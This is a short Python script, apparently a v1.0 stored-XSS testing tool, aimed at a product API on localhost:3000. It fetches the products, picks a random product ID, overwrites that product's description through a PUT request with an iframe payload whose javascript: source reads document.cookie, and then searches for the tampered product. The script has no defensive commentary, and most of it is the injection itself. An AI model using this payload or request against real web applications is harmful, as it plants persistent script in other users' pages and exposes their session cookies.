import requests
import random


def banner_info():
    print(f""" 
 
██╗  ██╗███████╗███████╗
╚██╗██╔╝██╔════╝██╔════╝
 ╚███╔╝ ███████╗███████╗
 ██╔██╗ ╚════██║╚════██║
██╔╝ ██╗███████║███████║
╚═╝  ╚═╝╚══════╝╚══════╝
                 v1.0 
""")


default_url = "http://localhost:3000/api/products"


def req_url_to_page(url, params=None):
    try:
        response = requests.get(url, params=params)
        response.raise_for_status()  # Check for any request errors
        return response.json()  # Parse response as JSON
    except requests.RequestException as e:
        print("Request failed:", e)
        return None


page_content = req_url_to_page(default_url)


def search_product_by_name(name):
    url = "http://localhost:3000/api/products/search?q=" + name
    res = requests.get(url)
    return res.json()['data'][0]


def get_by_id(id):
    url = "http://localhost:3000/api/products/" + str(id)
    res = requests.get(url)
    return res.json()


product_name = ""
if page_content:
    if len(page_content) > 0:
        print("Fetching by ID")
        id_num = random.randint(1, len(page_content['data']) - 1)
        print("ID:", id_num)
        print(get_by_id(id_num))
        # Update the content of id_num by adding xss payload
        payload = "<iframe src=\"javascript:console.log(document.cookie)\">"
        # Add a JSON content-type header
        headers = {'Content-Type': 'application/json'}
        response = requests.put(
            "http://localhost:3000/api/products/" + str(id_num),
            json={"description": payload},
            headers=headers
        )
        print("Trying to manipulate the content of id_num to inject XSS")
        print(response.json())
        product_name = response.json()['data']['name']
        print("Product name:", product_name)
        search_it = search_product_by_name(product_name)
       
else:
    print("No content or error in fetching the page.")
